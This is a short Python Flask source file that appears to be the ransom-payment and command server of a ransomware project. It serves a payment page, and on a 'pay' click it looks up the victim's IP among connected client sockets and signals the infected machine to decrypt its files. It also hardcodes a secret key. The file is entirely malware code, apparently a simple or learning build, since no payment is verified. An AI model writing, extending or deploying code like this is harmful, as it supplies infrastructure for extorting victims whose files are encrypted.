from flask import Flask, send_from_directory, request
from socket_server import SocketServer

static_url_path = ""
app = Flask("payment server", static_url_path=static_url_path)

app.secret_key = "jd9jKJ8M099h76B6g6B9989M0jHBughYG7yG7G87nKJO9k09hYUVGYV"

@app.route("/home")
def home():
    return send_from_directory("static", "home.html")

@app.route("/payment")
def payment():
    return send_from_directory("static", "payment.html")

@app.route('/pay_clicked', methods=["POST"])
def pay_clicked():
    ip = request.remote_addr
    socket_server = SocketServer.instance
    socket_server.send_data_to_client_socket(socket_server.client_sockets[ip], "paid")
    return "paid! decryption is being made right now!"

def start_server(host, port):
    app.run(host, port, threaded=True)
